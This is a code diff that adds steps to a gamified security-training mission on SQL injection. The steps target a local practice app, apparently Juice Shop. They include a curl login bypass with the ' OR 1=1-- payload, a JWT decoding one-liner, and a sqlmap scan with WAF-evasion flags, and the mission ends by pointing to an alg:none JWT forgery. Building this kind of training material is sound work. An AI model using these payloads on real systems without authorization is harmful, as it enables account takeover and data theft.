@@ -70,7 +70,41 @@ FIRST_MISSIONS = {
         "title": "Mission 02: SQL Injection Fundamentals",
         "description": "Learn how SQL injection works and exploit it manually before using automated tools.",
         "target": "http://localhost:3000",
-        "steps": [],  # Expanded in session
+        "steps": [
+            {
+                "id": 1,
+                "instruction": "First, confirm the login endpoint is reachable. Send an EMPTY POST so the server tells us what it expects:",
+                "command": "curl -s -X POST http://localhost:3000/rest/user/login -H 'Content-Type: application/json' -d '{}'",
+                "what_it_does": "Hitting the API with an empty body forces the server to respond with validation errors. Those errors leak schema info — field names, validators, sometimes stack traces. Quietest possible recon move.",
+                "what_to_look_for": "Note the error message structure (JSON), the field names mentioned (email, password), and the HTTP status code. This tells you the auth model BEFORE you start guessing payloads.",
+                "xp_reward": 25,
+            },
+            {
+                "id": 2,
+                "instruction": "Now try a classic SQLi payload in the email field — the goal is to log in WITHOUT knowing a password:",
+                "command": "curl -s -X POST http://localhost:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"\\' OR 1=1--\",\"password\":\"x\"}'",
+                "what_it_does": "The payload `' OR 1=1--` closes the SQL string, adds an always-true condition, and comments out the rest of the query. If the app is vulnerable, the database returns the FIRST user in the table — usually admin.",
+                "what_to_look_for": "If you get a JSON response with a `token` field, you just authenticated as the first user (admin). Save that token — you'll use it. If you get an error, the column may be different — try the next step.",
+                "xp_reward": 50,
+            },
+            {
+                "id": 3,
+                "instruction": "Confirm the auth worked by decoding the JWT to see WHO you are:",
+                "command": "echo 'PASTE_TOKEN_HERE' | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool",
+                "what_it_does": "JWTs are 3 base64-url-encoded sections joined by dots: header.payload.signature. We decode the payload (middle section) to see the user claims. No verification, just inspection — completely passive.",
+                "what_to_look_for": "Look for 'email', 'role', and 'id' fields. If role='admin' you have admin access. If role='customer', the SQLi returned the first customer — useful but not admin yet. The JWT is your session — use it in Authorization headers.",
+                "xp_reward": 40,
+            },
+            {
+                "id": 4,
+                "instruction": "Now use sqlmap to AUTOMATE finding more injection points across the app:",
+                "command": "sqlmap -u 'http://localhost:3000/rest/products/search?q=test' --batch --random-agent --level 2 --risk 1",
+                "what_it_does": "sqlmap probes the search endpoint with boolean-blind, time-blind, error-based, UNION, and stacked-query payloads. --batch auto-answers prompts. --random-agent rotates User-Agent per request to bypass naive WAF rules. --level 2 --risk 1 stays in the quieter range.",
+                "what_to_look_for": "sqlmap will print 'parameter is vulnerable' if it confirms injection. Note WHICH technique worked (boolean, UNION, etc.) — that tells you the DB engine and how to craft manual payloads. Save findings to ~/.sqlmap/output/ for later analysis.",
+                "xp_reward": 60,
+            },
+        ],
+        "completion_message": "You've owned the login form manually AND scaled it with sqlmap. Next: try the JWT forge — alg:none — to escalate from customer to admin without re-injecting.",
     },
 }
 
